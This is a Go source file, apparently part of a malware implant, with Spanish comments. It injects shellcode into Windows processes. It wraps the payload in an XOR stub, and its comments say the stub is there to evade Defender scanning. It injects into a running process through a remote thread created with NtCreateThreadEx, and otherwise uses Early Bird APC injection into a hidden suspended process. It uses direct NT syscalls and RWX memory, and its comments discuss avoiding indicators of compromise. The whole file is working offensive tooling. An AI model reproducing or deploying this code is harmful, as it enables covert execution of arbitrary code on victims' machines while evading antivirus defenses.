package injection

import (
	"fmt"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	PAGE_SIZE         = 0x1000
	STARTF_BLOCK_DLLS = 0x00000400
)

type ClassicInjector struct{}

func (i *ClassicInjector) Inject(targetProc string, payload []byte) error {
	// Envolver payload con stub XOR: Defender verá bytes aleatorios al escanear
	wrapped := wrapWithDecryptor(payload)

	// Intentar inyectar en un proceso ya existente (no crea proceso suspendido,
	// que es un IOC fuerte). Si no existe, crear uno nuevo.
	procName := filepath.Base(targetProc)
	if pid, err := findPID(procName); err == nil {
		Log.Printf("[inj] Proceso existente encontrado PID=%d, usando injectExisting\n", pid)
		if err2 := injectExisting(pid, wrapped); err2 == nil {
			Log.Println("[inj] injectExisting OK")
			return nil
		} else {
			Log.Println("[inj] injectExisting falló:", err2)
		}
	} else {
		Log.Println("[inj] No hay proceso existente, usando Early Bird APC")
	}

	return injectSuspended(targetProc, wrapped)
}

// findPID busca el PID de un proceso por nombre.
func findPID(name string) (uint32, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snap)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	for windows.Process32Next(snap, &entry) == nil {
		if strings.EqualFold(syscall.UTF16ToString(entry.ExeFile[:]), name) {
			return entry.ProcessID, nil
		}
	}
	return 0, fmt.Errorf("not found")
}

// injectExisting inyecta en un proceso ya corriendo (sin CREATE_SUSPENDED).
func injectExisting(pid uint32, payload []byte) error {
	hProc, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hProc)

	baseAddr, err := allocAndWrite(hProc, payload, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return err
	}

	// Crear hilo remoto vía NtCreateThreadEx
	var hThread windows.Handle
	ret, _ := ntCall(_sCreateThread,
		uintptr(unsafe.Pointer(&hThread)),
		uintptr(windows.PROCESS_ALL_ACCESS),
		0,
		uintptr(hProc),
		baseAddr,
		0, 0, 0, 0, 0,
	)
	if ret != 0 {
		return fmt.Errorf("thread: 0x%x", ret)
	}
	windows.CloseHandle(hThread)
	return nil
}

// injectSuspended usa Early Bird APC en un proceso recién creado (suspendido).
func injectSuspended(targetProc string, payload []byte) error {
	Log.Println("[inj] injectSuspended: creando proceso suspendido")
	si := &windows.StartupInfo{
		Flags:      windows.STARTF_USESHOWWINDOW | STARTF_BLOCK_DLLS,
		ShowWindow: windows.SW_HIDE,
	}
	pi := &windows.ProcessInformation{}

	cmd, err := windows.UTF16PtrFromString(targetProc)
	if err != nil {
		return fmt.Errorf("utf16: %v", err)
	}
	if err = windows.CreateProcess(nil, cmd, nil, nil, false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, si, pi); err != nil {
		return fmt.Errorf("spawn: %v", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// El stub XOR necesita RWX: escribe (descifra in-place) y ejecuta
	baseAddr, err := allocAndWrite(pi.Process, payload, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	Log.Printf("[inj] Payload escrito en 0x%x, enviando APC\n", baseAddr)

	ret, _ := ntCall(_sQueueApc, uintptr(pi.Thread), baseAddr, 0, 0, 0)
	if ret != 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("apc: 0x%x", ret)
	}
	Log.Println("[inj] APC encolado, resumiendo hilo")

	ret, _ = ntCall(_sResume, uintptr(pi.Thread), 0)
	if ret != 0 {
		return fmt.Errorf("resume: 0x%x", ret)
	}
	Log.Println("[inj] Hilo resumido - shellcode debería ejecutarse")
	return nil
}

// allocAndWrite reserva memoria RW, escribe el payload, cambia al permiso indicado.
// Usar PAGE_EXECUTE_READWRITE cuando el payload contiene un stub que escribe en memoria.
// Usar PAGE_EXECUTE_READ cuando el payload es código ya descifrado.
func allocAndWrite(hProc windows.Handle, payload []byte, finalProt uint32) (uintptr, error) {
	regionSize := alignSize(uintptr(len(payload)), PAGE_SIZE)
	var baseAddr uintptr

	ret, _ := ntCall(_sAlloc,
		uintptr(hProc),
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if ret != 0 {
		return 0, fmt.Errorf("alloc: 0x%x", ret)
	}

	for off := 0; off < len(payload); {
		end := off + 1024
		if end > len(payload) {
			end = len(payload)
		}
		var written uintptr
		ret, _ = ntCall(_sWrite,
			uintptr(hProc),
			baseAddr+uintptr(off),
			uintptr(unsafe.Pointer(&payload[off])),
			uintptr(end-off),
			uintptr(unsafe.Pointer(&written)),
		)
		if ret != 0 {
			return 0, fmt.Errorf("write @%d: 0x%x", off, ret)
		}
		off = end
	}

	var oldProt uint32
	ret, _ = ntCall(_sProtect,
		uintptr(hProc),
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(finalProt),
		uintptr(unsafe.Pointer(&oldProt)),
	)
	if ret != 0 {
		return 0, fmt.Errorf("protect: 0x%x", ret)
	}

	return baseAddr, nil
}

func alignSize(size, alignment uintptr) uintptr {
	return (size + alignment - 1) &^ (alignment - 1)
}
